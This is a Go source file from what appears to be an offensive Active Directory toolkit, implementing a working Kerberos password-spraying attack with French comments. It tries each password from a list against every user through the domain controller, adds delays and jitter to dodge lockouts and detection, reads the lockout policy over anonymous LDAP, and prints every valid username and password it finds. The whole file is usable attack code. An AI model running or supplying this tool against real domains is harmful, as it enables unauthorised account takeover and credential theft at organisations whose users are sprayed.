// pkg/spray/spray.go
package spray

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"adgo/pkg/ldap"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// SprayConfig configuration du password spraying
type SprayConfig struct {
	UsersFile     string
	PasswordsFile string
	Domain        string
	DCIP          string
	Delay         int // Délai entre tentatives (secondes)
	Jitter        int // Variation aléatoire du délai (%)
	Threads       int // Nombre de threads parallèles (défaut: 1)
	Verbose       bool
	LockoutCheck  bool // Vérifier la politique de lockout avant de commencer
	StopOnSuccess bool // Arrêter dès la première réussite
}

// SprayResult résultat d'une tentative de spray
type SprayResult struct {
	Username  string
	Password  string
	Success   bool
	Error     string
	Timestamp time.Time
}

// SpraySummary résumé global du spray
type SpraySummary struct {
	TotalAttempts   int
	SuccessfulCreds []SprayResult
	FailedAttempts  int
	LockedAccounts  []string
	Duration        time.Duration
	StartTime       time.Time
	EndTime         time.Time
}

// PasswordSpray exécute un password spray avec protection anti-lockout.
//
// Stratégie : on spray UN mot de passe sur TOUS les users, on attend,
// puis le mot de passe suivant. Cela évite les lockouts sur un compte unique.
func PasswordSpray(cfg *SprayConfig) (*SpraySummary, error) {
	summary := &SpraySummary{
		StartTime: time.Now(),
	}

	// 1. Charger les utilisateurs
	users, err := loadLines(cfg.UsersFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load users: %v", err)
	}

	// 2. Charger les mots de passe
	passwords, err := loadLines(cfg.PasswordsFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load passwords: %v", err)
	}

	fmt.Printf("[*] Loaded %d users and %d passwords\n", len(users), len(passwords))

	// 3. Vérifier la politique de lockout (IMPORTANT!)
	if cfg.LockoutCheck {
		if err := checkLockoutPolicy(cfg.Domain, cfg.DCIP); err != nil {
			fmt.Printf("[!] Warning: Could not verify lockout policy: %v\n", err)
			fmt.Println("[!] Continuing anyway - be careful!")
		}
	}

	// 4. Délai de base (on utilise cfg.Delay directement — pas de recalcul)
	baseDelay := cfg.Delay
	if baseDelay < 1 {
		baseDelay = 1
	}
	fmt.Printf("[*] Using delay: %d seconds (±%d%% jitter)\n", baseDelay, cfg.Jitter)
	fmt.Printf("[*] Estimated duration: %v\n", estimateDuration(len(users), len(passwords), baseDelay))

	// 5. Limiter le nombre de threads simultanés (semaphore)
	threads := cfg.Threads
	if threads < 1 {
		threads = 1
	}
	sem := make(chan struct{}, threads)

	// Compteurs atomiques pour éviter les race conditions
	var totalAttempts int64
	var failedAttempts int64

	// Mutex pour les slices partagées
	var mu sync.Mutex

	// Canal d'arrêt pour --stop-on-success
	stop := make(chan struct{})
	stopped := false

	// 6. Spray par mot de passe (PAS par utilisateur!)
	for _, password := range passwords {
		// Vérifier si on doit s'arrêter
		select {
		case <-stop:
			goto done
		default:
		}

		fmt.Printf("\n[*] Spraying password: %s\n", maskPassword(password))

		var wg sync.WaitGroup

		for _, username := range users {
			// Vérifier stop avant chaque goroutine
			select {
			case <-stop:
				goto waitAndContinue
			default:
			}

			wg.Add(1)
			sem <- struct{}{} // Acquérir le semaphore (bloque si threads saturés)

			go func(user, pass string) {
				defer wg.Done()
				defer func() { <-sem }() // Libérer le semaphore

				result := tryCredential(user, pass, cfg.Domain, cfg.DCIP)

				// Mise à jour thread-safe des compteurs
				atomic.AddInt64(&totalAttempts, 1)
				if result.Success {
					mu.Lock()
					summary.SuccessfulCreds = append(summary.SuccessfulCreds, result)
					alreadyStopped := stopped
					mu.Unlock()

					if cfg.Verbose || result.Success {
						printResult(result)
					}

					if cfg.StopOnSuccess && !alreadyStopped {
						mu.Lock()
						if !stopped {
							stopped = true
							close(stop)
							fmt.Println("[+] Success! Stopping spray...")
						}
						mu.Unlock()
					}
				} else {
					atomic.AddInt64(&failedAttempts, 1)

					if cfg.Verbose {
						printResult(result)
					}

					// Détecter les comptes verrouillés
					if result.Error == "account locked or disabled" {
						mu.Lock()
						summary.LockedAccounts = append(summary.LockedAccounts, result.Username)
						mu.Unlock()
						printResult(result)
					}
				}

				// Délai inter-tentative avec jitter (dans la goroutine)
				if baseDelay > 0 {
					delay := applyJitter(baseDelay, cfg.Jitter)
					time.Sleep(time.Duration(delay) * time.Second)
				}
			}(username, password)
		}

	waitAndContinue:
		wg.Wait()

		// Vérifier stop après le round
		select {
		case <-stop:
			goto done
		default:
		}

		// Pause entre chaque mot de passe (délai × 2)
		if len(passwords) > 1 {
			pauseDuration := time.Duration(baseDelay*2) * time.Second
			fmt.Printf("[*] Pausing %v before next password...\n", pauseDuration)
			time.Sleep(pauseDuration)
		}
	}

done:
	// Transférer les compteurs atomiques dans le résumé
	summary.TotalAttempts = int(atomic.LoadInt64(&totalAttempts))
	summary.FailedAttempts = int(atomic.LoadInt64(&failedAttempts))
	summary.EndTime = time.Now()
	summary.Duration = summary.EndTime.Sub(summary.StartTime)

	return summary, nil
}

// tryCredential teste une combinaison user/password via Kerberos
func tryCredential(username, password, domain, dcIP string) SprayResult {
	result := SprayResult{
		Username:  username,
		Password:  password,
		Timestamp: time.Now(),
	}

	realm := strings.ToUpper(domain)

	krb5Conf := fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_kdc = false
    forwardable = true

[realms]
    %s = {
        kdc = %s:88
        admin_server = %s
    }

[domain_realm]
    .%s = %s
    %s = %s
`, realm, realm, dcIP, dcIP,
		strings.ToLower(domain), realm,
		strings.ToLower(domain), realm)

	cfg, err := config.NewFromString(krb5Conf)
	if err != nil {
		result.Error = fmt.Sprintf("config error: %v", err)
		return result
	}

	cl := client.NewWithPassword(username, realm, password, cfg,
		client.DisablePAFXFAST(true))

	err = cl.Login()
	if err == nil {
		result.Success = true
		return result
	}

	errStr := err.Error()
	switch {
	case strings.Contains(errStr, "KDC_ERR_PREAUTH_FAILED"):
		result.Error = "invalid credentials"
	case strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN"):
		result.Error = "user not found"
	case strings.Contains(errStr, "KDC_ERR_CLIENT_REVOKED"):
		result.Error = "account locked or disabled"
	case strings.Contains(errStr, "KDC_ERR_KEY_EXPIRED"):
		result.Error = "password expired"
	case strings.Contains(errStr, "KDC_ERR_WRONG_REALM"):
		result.Error = "wrong domain/realm"
	default:
		result.Error = fmt.Sprintf("KDC error: %v", err)
	}

	return result
}

// checkLockoutPolicy vérifie la politique de lockout du domaine via LDAP anonyme
func checkLockoutPolicy(domain, dcIP string) error {
	fmt.Println("[*] Checking domain lockout policy...")

	ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
	baseDN := domainToBaseDN(domain)

	ctx := context.Background()
	ldapClient, err := ldap.NewClient(ctx, ldapURL, "", "", false)
	if err != nil {
		return fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer ldapClient.Close()

	policy, err := ldapClient.GetPasswordPolicy(baseDN)
	if err != nil {
		return fmt.Errorf("failed to get password policy: %v", err)
	}

	fmt.Printf("[*] Domain Password Policy:\n")
	fmt.Printf("    Lockout Threshold : %d attempts\n", policy.LockoutThreshold)
	fmt.Printf("    Lockout Duration  : %d minutes\n", policy.LockoutDurationMinutes)
	fmt.Printf("    Min Password Len  : %d\n", policy.MinPasswordLength)

	if policy.LockoutThreshold > 0 && policy.LockoutThreshold < 5 {
		fmt.Printf("[!] WARNING: Low lockout threshold (%d)! Be very careful.\n", policy.LockoutThreshold)
		fmt.Println("[!] Recommended: use only 1-2 passwords per spray round")
	}

	return nil
}

// applyJitter ajoute une variation aléatoire au délai (en secondes)
func applyJitter(delay, jitterPercent int) int {
	if jitterPercent == 0 || delay == 0 {
		return delay
	}

	variation := float64(delay) * (float64(jitterPercent) / 100.0)
	jitter := rand.Float64()*variation*2 - variation

	result := delay + int(jitter)
	if result < 1 {
		return 1
	}
	return result
}

// estimateDuration estime la durée totale du spray
func estimateDuration(users, passwords, delay int) time.Duration {
	totalAttempts := users * passwords
	totalSeconds := totalAttempts * delay
	pauseSeconds := (passwords - 1) * delay * 2
	return time.Duration(totalSeconds+pauseSeconds) * time.Second
}

// printResult affiche un résultat de façon formatée
func printResult(r SprayResult) {
	timestamp := r.Timestamp.Format("15:04:05")
	if r.Success {
		fmt.Printf("[%s] [+] SUCCESS: %s:%s\n", timestamp, r.Username, r.Password)
	} else if r.Error == "account locked or disabled" {
		fmt.Printf("[%s] [!] LOCKED: %s\n", timestamp, r.Username)
	} else {
		fmt.Printf("[%s] [-] %s:%s - %s\n", timestamp, r.Username, maskPassword(r.Password), r.Error)
	}
}

// PrintSummary affiche un résumé du spray
func PrintSummary(summary *SpraySummary) {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("PASSWORD SPRAY SUMMARY")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("Duration       : %v\n", summary.Duration.Round(time.Second))
	fmt.Printf("Total Attempts : %d\n", summary.TotalAttempts)
	fmt.Printf("Successful     : %d\n", len(summary.SuccessfulCreds))
	fmt.Printf("Failed         : %d\n", summary.FailedAttempts)
	fmt.Printf("Locked         : %d\n", len(summary.LockedAccounts))

	if len(summary.SuccessfulCreds) > 0 {
		fmt.Println("\n[+] VALID CREDENTIALS:")
		for _, cred := range summary.SuccessfulCreds {
			fmt.Printf("    %s:%s\n", cred.Username, cred.Password)
		}
	}

	if len(summary.LockedAccounts) > 0 {
		fmt.Println("\n[!] POTENTIALLY LOCKED ACCOUNTS:")
		for _, account := range summary.LockedAccounts {
			fmt.Printf("    %s\n", account)
		}
	}

	fmt.Println(strings.Repeat("=", 60))
}

// ============================================================
// Helpers
// ============================================================

func loadLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func maskPassword(password string) string {
	if len(password) <= 3 {
		return "***"
	}
	return password[:2] + strings.Repeat("*", len(password)-2)
}

func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	dnParts := make([]string, len(parts))
	for i, part := range parts {
		dnParts[i] = "DC=" + part
	}
	return strings.Join(dnParts, ",")
}
